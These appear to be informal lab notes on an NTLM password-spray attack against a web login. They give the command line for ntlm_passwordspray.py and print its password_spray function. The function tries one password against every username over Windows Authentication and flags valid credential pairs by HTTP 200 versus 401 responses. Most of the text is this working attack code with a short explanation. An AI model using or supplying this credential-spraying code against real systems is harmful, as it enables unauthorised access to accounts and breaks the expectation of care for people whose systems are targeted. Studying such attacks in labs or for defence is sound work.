Basically spray attack against web interface 
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
There is more to it then this as you need classes and everything go to breach if you want full script
__________________________________________________________________________________________________________
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
____________________________________________________________________________________________________________
This function takes our suggested password and the URL that we are targeting as input and attempts to authenticate to the URL with each username in the textfile.
By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not.
If the credential pair is valid, the application would respond with a 200 HTTP (OK) code.
If the pair is invalid, the application will return a 401 HTTP (Unauthorised) code.
